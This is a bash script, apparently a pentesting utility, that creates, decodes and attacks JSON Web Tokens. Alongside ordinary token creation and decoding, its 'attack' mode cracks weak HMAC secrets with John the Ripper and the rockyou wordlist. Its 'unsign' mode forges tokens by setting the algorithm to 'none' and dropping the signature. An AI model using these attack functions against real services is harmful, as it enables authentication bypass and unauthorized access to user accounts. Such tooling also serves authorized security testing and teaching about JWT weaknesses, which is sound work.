#!/bin/bash

# Create JWT token
create() {
	if [[ $# -lt 3 || $2 == '-h' || $2 == '--help' ]]; then
		echo "USAGE: $1 PAYLOAD SECRET [ALGORITHM (default: HS256)]
	ALGORITHM: HS256 HS512"
		exit
	fi
	payload=$2
	secret=$3
	alg=$4
	if [[ -z $alg ]]; then
		alg='HS256'
	fi
	# Based on https://stackoverflow.com/questions/59002949/how-to-create-a-json-web-token-jwt-using-openssl-shell-commands
	jwt_header=$(echo -n '{"typ":"JWT","alg":"'$alg'"}' | base64 | sed s/\+/-/g | sed 's/\//_/g' | sed -E s/=+$//)
	payload=$(echo -n $payload | base64 | sed s/\+/-/g |sed 's/\//_/g' |  sed -E s/=+$//)
	hexsecret=$(echo -n "$secret" | xxd -p | paste -sd "")
	case $alg in
		HS256) openssl_alg=sha256;;
		HS512) openssl_alg=sha512;;
		*) echo "Algorithm $alg not supported"; exit 1;;
	esac
	hmac_signature=$(echo -n "${jwt_header}.${payload}" | openssl dgst -$openssl_alg -mac HMAC -macopt key:$secret -binary | base64 -w 0 | sed s/\+/-/g | sed 's/\//_/g' | sed -E s/=+$//)

	echo "${jwt_header}.${payload}.${hmac_signature}"
}
# Decode JWT token
decode() {
	if [[ $# -lt 2 || $2 == '-h' || $2 == '--help' ]]; then
		echo "USAGE: $1 JWT"
		exit
	fi
	for l in $(echo -n $2 | cut -d. -f 1,2 | tr '.' '\n'); do
		echo -n "$(echo $l | base64 -d 2>/dev/null) "
	done
}
# Weak password attack on JWT token
attack() {
	if [[ $# -lt 2 || $2 == '-h' || $2 == '--help' ]]; then
		echo "USAGE: $1 JWT [WORDLIST (default: )]"
		exit
	fi
	data=($(decode _ $2))
       	alg=$(echo ${data[0]} | jq '.["alg"]' | tr -d '"')
	temp_file=$(mktemp)
	echo $2 > $temp_file
	case $alg in
		HS256) john_alg=HMAC-SHA256;;
		HS512) john_alg=HMAC-SHA512;;
		*) echo "Algorithm $alg not supported"; exit 1;;
	esac
	wl=$3
	if [[ -z $wl ]]; then
		wl=/usr/share/wordlists/rockyou.txt
	fi
	john -wordlist=$wl --format=$john_alg $temp_file
	rm $temp_file
}
# Disable token signing algorithm
unsign() {
	if [[ $# -lt 2 || $2 == '-h' || $2 == '--help' ]]; then
		echo "USAGE: $1 JWT"
		exit
	fi
	data=($(decode _ $2))
	echo -n "$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w 0).$(echo $2 | cut -d. -f 2)." 
}

case $1 in
	create|unsign|decode|attack) $1 $@;;
	*) echo "USAGE: $0 MODE [-h | MODE_ARGS]
Simple tool for JWT creation/modification/decoding/attacking.
MODES:
create - create token
unsign - set token alg to \"none\" and remove signature
decode - decode token
attack - weak password attack on given token"
	exit 1;;
esac
